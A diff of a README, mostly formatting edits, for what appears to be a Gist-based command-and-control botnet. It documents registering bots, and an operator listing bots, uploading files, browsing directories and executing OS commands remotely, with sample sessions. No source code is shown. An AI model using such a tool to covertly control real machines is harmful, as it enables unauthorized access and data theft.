@@ -10,10 +10,10 @@ python3+
 
 `bot.py <gist_api_token> [<command_fetch_interval[s]> <bot_id> <init_datetime>]`
 
-`<gist_api_token>` - token for the gist api
-`<command_fetch_interval[s]>` - command fetch interval (in seconds, default = 1)
-`<bot_id>` - id of the preregistered bot (if none provided, it will be registered)
-`<init_datetime>` - init time to fetch commands (format '%Y-%m-%dT%H:%M:%SZ', default = '1900-01-01T00:00:00Z')
+* `<gist_api_token>` - token for the gist api
+* `<command_fetch_interval[s]>` - command fetch interval (in seconds, default = 1)
+* `<bot_id>` - id of the preregistered bot (if none provided, it will be registered)
+* `<init_datetime>` - init time to fetch commands (format '%Y-%m-%dT%H:%M:%SZ', default = '1900-01-01T00:00:00Z')
 
 #### Example
 
@@ -27,35 +27,23 @@ python bot.py 349ab29asxtabw423bva5hca5623bc39b8c8
 
 `bot_master.py <gist_api_token>`
 
-`<gist_api_token>` - token for the gist api
+* `<gist_api_token>` - token for the gist api
 
 #### Interactive usage
 
-`bots` - list all bots
-
-`select <bot_id>` - select a bot
-
-`send <local_source_file> <remote_target_file>` - send file to a current bot's environment
-
-`cm <command>` - send a command (to current bot). Available commands:
-
-    `ls <dir path>` - list files in the directory
-    
-    `cp <source> <target>` - copy a remote file
-    
-    `exec <os command and args>` - execute OS command
-    
-`history` - print a command history (of selected bot)
-
-`result <command_id>` - print the result of a command (of current bot)
-
-`info` - print info about environment (of current bot)
-
-`last` - print the result of the last executed command (of current bot)
-
-`help` - for help
-
-`exit` - to exit
+* `bots` - list all bots
+* `select <bot_id>` - select a bot
+* `send <local_source_file> <remote_target_file>` - send file to a current bot's environment
+* `cm <command>` - send a command (to current bot). Available commands:
+  * `ls <dir path>` - list files in the directory
+  * `cp <source> <target>` - copy a remote file
+  * `exec <os command and args>` - execute OS command
+* `history` - print a command history (of selected bot)
+* `result <command_id>` - print the result of a command (of current bot)
+* `info` - print info about environment (of current bot)
+* `last` - print the result of the last executed command (of current bot)
+* `help` - for help
+* `exit` - to exit
 
 #### Example
 
@@ -65,11 +53,11 @@ python bot_master.py 349ab29asxtabw423bva5hca5623bc39b8c8
 
 ## Example
 
-___1. Run bots in two different environment:___
+___1. Run bots in two different environments:___
 
 _Bot #1:_
-
 ```
+username@hostname:~/$ python3 bot.py 349ab29asxtabw423bva5hca5623bc39b8c8
 25/12/2020 14:03:20 [INFO] Registering the bot...
 25/12/2020 14:03:22 [INFO] Successfully registered. Bot id = b569e438c685b70458e51907b40e51e5
 25/12/2020 14:03:22 [INFO] Fetching new commands...
@@ -77,8 +65,8 @@ _Bot #1:_
 ```
 
 _Bot #2:_
-
 ```
+C:\app>python bot_master.py 349ab29asxtabw423bva5hca5623bc39b8c8
 25/12/2020 15:06:29 [INFO] Registering the bot...
 25/12/2020 15:06:30 [INFO] Successfully registered. Bot id = 198a0a574b6b3e0c6a89753a853c4e6d
 25/12/2020 15:06:30 [INFO] Fetching new commands...
@@ -86,16 +74,15 @@ _Bot #2:_
 ```
 
 ___2. Run bot master and check the list of registered bots:___
-
 ```
+username@hostname:~/$ python3 bot_master.py 349ab29asxtabw423bva5hca5623bc39b8c8
 [None]: bots
 [None]: {'id': '198a0a574b6b3e0c6a89753a853c4e6d', 'registered': '2020-12-25T14:06:31Z', 'updated': '2020-12-25T14:06:32Z'}
 [None]: {'id': 'b569e438c685b70458e51907b40e51e5', 'registered': '2020-12-25T14:03:21Z', 'updated': '2020-12-25T14:03:22Z'}
 ```
 ___3. Send commands to bots:___
 
-_select bot:_
-
+_select a bot:_
 ```
 [None]: select 198a0a574b6b3e0c6a89753a853c4e6d
 [198a0a574b6b3e0c6a89753a853c4e6d]: select b569e438c685b70458e51907b40e51e5
@@ -103,37 +90,35 @@ _select bot:_
 ```
 
 _info:_
-
 ```
 [b569e438c685b70458e51907b40e51e5]: info
 [b569e438c685b70458e51907b40e51e5]: ['Linux-4.12.0-1-amd64-x86_64-with-debian-10.5', 'hacker', ['192.168.8.21', '172.16.1.21']]
 ```
 
-_send commands:_
-
+_send a commands:_
 ```
 [b569e438c685b70458e51907b40e51e5]: cm ls /
 [b569e438c685b70458e51907b40e51e5]: Sent command id: gASVDgAAAAAAAABdlCiMAmxzlIwBL5RlLg==
 [b569e438c685b70458e51907b40e51e5]: cm ls /usr
 [b569e438c685b70458e51907b40e51e5]: Sent command id: gASVEQAAAAAAAABdlCiMAmxzlIwEL3VzcpRlLg==
 ```
-_get result of the last command:_
 
+_get result of the last command:_
 ```
 [b569e438c685b70458e51907b40e51e5]: last
 [b569e438c685b70458e51907b40e51e5]:
 ['ls', '/usr']
 ['include', 'share', 'lib', 'src', 'local', 'games', 'bin', 'lib32', 'sbin']
 ```
-_checking command history:_
 
+_checking the command history:_
 ```
 [b569e438c685b70458e51907b40e51e5]: history
 [b569e438c685b70458e51907b40e51e5]: {'command_id': 'gASVDgAAAAAAAABdlCiMAmxzlIwBL5RlLg==', 'command': ['ls', '/']}
 [b569e438c685b70458e51907b40e51e5]: {'command_id': 'gASVEQAAAAAAAABdlCiMAmxzlIwEL3VzcpRlLg==', 'command': ['ls', '/usr']}
 ```
-_get result of the command from history:_
 
+_get result of the command from history:_
 ```
 [b569e438c685b70458e51907b40e51e5]: result gASVDgAAAAAAAABdlCiMAmxzlIwBL5RlLg==
 [b569e438c685b70458e51907b40e51e5]:
@@ -141,8 +126,8 @@ _get result of the command from history:_
 ['dev', 'ClassData', 'opt', 'run', 'lib', 'sys', 'var', 'media', 'boot', 'mnt', 'srv', 'flag', 'etc', 'pro
 c', 'TeamsData', '.dockerenv', 'bin', 'usr', 'home', 'lib32', 'sbin', 'lib64', 'root', 'tmp']
 ```
-_select another bot and send commands:_
 
+_select another bot and send commands:_
 ```
 [b569e438c685b70458e51907b40e51e5]: select 198a0a574b6b3e0c6a89753a853c4e6d
 [198a0a574b6b3e0c6a89753a853c4e6d]: Selected 198a0a574b6b3e0c6a89753a853c4e6d
@@ -153,8 +138,8 @@ _select another bot and send commands:_
 ['ls', 'D:/tmp']
 ['app.log']
 ```
-_send a local file to bot:_
 
+_send a local file to bot:_
 ```
 [198a0a574b6b3e0c6a89753a853c4e6d]: send /home/user/bot.py D:/tmp/bot.py
 [198a0a574b6b3e0c6a89753a853c4e6d]: Uploading file content /home/user/bot.py
@@ -173,7 +158,6 @@ Created: D:/tmp/bot.py
 ```
 
 _change bot and execute OS command:_
-
 ```
 [198a0a574b6b3e0c6a89753a853c4e6d]: select b569e438c685b70458e51907b40e51e5
 [b569e438c685b70458e51907b40e51e5]: Selected b569e438c685b70458e51907b40e51e5
